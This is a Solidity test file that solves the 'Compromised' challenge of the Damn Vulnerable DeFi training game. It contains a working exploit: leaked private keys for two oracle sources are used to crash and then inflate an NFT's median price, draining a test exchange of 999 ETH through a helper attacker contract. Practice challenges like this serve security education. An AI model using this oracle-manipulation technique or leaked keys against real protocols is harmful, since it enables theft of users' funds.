// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
import {Exchange} from "../../src/compromised/Exchange.sol";
import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract CompromisedChallenge is Test {

    address deployer = makeAddr("deployer");
    address player   = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant EXCHANGE_INITIAL_ETH_BALANCE = 999 ether;
    uint256 constant INITIAL_NFT_PRICE            = 999 ether;
    uint256 constant PLAYER_INITIAL_ETH_BALANCE   = 0.1 ether;
    uint256 constant TRUSTED_SOURCE_INITIAL_ETH_BALANCE = 2 ether;

    address[] sources = [
        0x188Ea627E3531Db590e6f1D71ED83628d1933088,
        0xA417D473c40a4d42BAd35f147c21eEa7973539D8,
        0xab3600bF153A316dE44827e2473056d56B774a40
    ];

    string[] symbols = ["DVNFT"];
    uint256[] prices  = [INITIAL_NFT_PRICE];

    TrustfulOracle oracle;
    Exchange       exchange;
    DamnValuableNFT nft;

    modifier checkSolved() {
        _;
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Fund trusted sources
        for (uint256 i = 0; i < sources.length; i++) {
            payable(sources[i]).transfer(TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }

        // Fund player
        payable(player).transfer(PLAYER_INITIAL_ETH_BALANCE);

        // Deploy oracle and initializer
        oracle = (new TrustfulOracleInitializer(sources, symbols, prices)).oracle();

        // Deploy exchange and fund it
        exchange = new Exchange{value: EXCHANGE_INITIAL_ETH_BALANCE}(address(oracle));
        nft = exchange.token();

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        for (uint256 i = 0; i < sources.length; i++) {
            assertEq(sources[i].balance, TRUSTED_SOURCE_INITIAL_ETH_BALANCE);
        }
        assertEq(player.balance, PLAYER_INITIAL_ETH_BALANCE);
        assertEq(address(exchange).balance, EXCHANGE_INITIAL_ETH_BALANCE);
        assertEq(oracle.getMedianPrice(symbols[0]), INITIAL_NFT_PRICE);
    }

    /**
     * =========================================================
     * SOLUTION — test_compromised()
     * =========================================================
     * Attack: Oracle manipulation via leaked private keys
     *
     * The HTTP response contains two hex-encoded strings. Decoded:
     *   hex bytes → ASCII → Base64 → raw private key bytes
     *
     * These are the private keys of 2 of 3 oracle sources, giving
     * majority control over the median price. Steps:
     *
     * 1. Crash price to 0: sources[0,1] post 0 → median [0,0,999] = 0
     * 2. Buy one DVNFT for 1 wei (min nonzero payment, price=0, change returned)
     * 3. Inflate price to 999 ETH: sources[0,1] post 999e18 → median = 999 ETH
     * 4. Sell NFT at 999 ETH — drains the full exchange balance
     * 5. Restore price to INITIAL_NFT_PRICE — required by _isSolved() oracle check
     * 6. Forward all recovered ETH to recovery address
     *
     * Note: uses checkSolved (not checkSolvedByPlayer) — no player prank needed.
     * Oracle manipulation is done directly via vm.prank(sourceAddress).
     * =========================================================
     */
    function test_compromised() public checkSolved {
        // Private keys recovered by decoding the HTTP response data:
        // Remove spaces → hex bytes → ASCII string → Base64 decode → private key
        // Server leak 1 → 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744
        // Server leak 2 → 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159
        uint256 privateKey1 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
        uint256 privateKey2 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;

        address source1 = vm.addr(privateKey1); // 0x188Ea627E3531Db590e6f1D71ED83628d1933088
        address source2 = vm.addr(privateKey2); // 0xA417D473c40a4d42BAd35f147c21eEa7973539D8

        // Step 1: Crash NFT price to 0 — sorted prices become [0, 0, 999], median index 1 = 0
        vm.prank(source1);
        oracle.postPrice("DVNFT", 0);
        vm.prank(source2);
        oracle.postPrice("DVNFT", 0);

        // Step 2: Deploy attacker and buy one NFT for 1 wei
        // buyOne() requires msg.value > 0; price is 0 so 1 wei change is returned
        CompromisedAttacker attacker = new CompromisedAttacker{value: player.balance}(
            oracle, exchange, nft, recovery
        );
        attacker.buy();

        // Step 3: Inflate price to exactly 999 ETH (= EXCHANGE_INITIAL_ETH_BALANCE)
        // All three sources now post 999e18 → median = 999 ETH → exactly drains exchange
        vm.prank(source1);
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);
        vm.prank(source2);
        oracle.postPrice("DVNFT", EXCHANGE_INITIAL_ETH_BALANCE);

        // Step 4: Sell NFT — exchange pays out median price (999 ETH), NFT is burned
        attacker.sell();

        // Step 5: Restore original price — _isSolved() asserts oracle.getMedianPrice("DVNFT") == INITIAL_NFT_PRICE
        vm.prank(source1);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
        vm.prank(source2);
        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);

        // Step 6: Transfer recovered ETH to recovery address
        attacker.recover();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Exchange doesn't have ETH anymore
        assertEq(address(exchange).balance, 0);
        // ETH was deposited into the recovery account
        assertEq(recovery.balance, EXCHANGE_INITIAL_ETH_BALANCE);
        // Player must not own any NFT
        assertEq(nft.balanceOf(player), 0);
        // NFT price didn't change
        assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
    }

}

/**
 * =========================================================
 * SOLUTION CONTRACT — CompromisedAttacker
 * =========================================================
 * Holds ETH and the purchased NFT between price manipulation
 * steps. Implements IERC721Receiver so exchange.buyOne() can
 * safely mint directly to this contract via safeMint().
 * All oracle manipulation happens in the test function itself
 * via vm.prank — this contract only handles buy/sell/recover.
 * Placed after the test class per DVDv4 convention.
 * =========================================================
 *
 * @notice Intermediate contract for the Compromised challenge exploit
 * @dev Holds player ETH and the DVNFT between the price manipulation steps.
 *      Must implement IERC721Receiver since exchange uses safeMint().
 * @param _oracle  The TrustfulOracle — stored for reference
 * @param _exchange The Exchange contract to buy from and sell to
 * @param _nft     The DamnValuableNFT token contract
 * @param _recovery Destination for recovered ETH
 */
contract CompromisedAttacker is IERC721Receiver {

    TrustfulOracle  oracle;
    Exchange        exchange;
    DamnValuableNFT nft;
    address         recovery;
    uint256         nftId;

    constructor(
        TrustfulOracle  _oracle,
        Exchange        _exchange,
        DamnValuableNFT _nft,
        address         _recovery
    ) payable {
        oracle   = _oracle;
        exchange = _exchange;
        nft      = _nft;
        recovery = _recovery;
    }

    /// @notice Buy one NFT — price must be set to 0 before calling
    function buy() external {
        nftId = exchange.buyOne{value: 1}();
    }

    /// @notice Sell the NFT — price must be set to exchange balance before calling
    function sell() external {
        nft.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    /// @notice Forward all ETH to recovery
    function recover() external {
        payable(recovery).transfer(address(this).balance);
    }

    function onERC721Received(address, address, uint256, bytes calldata)
        external pure returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}

}
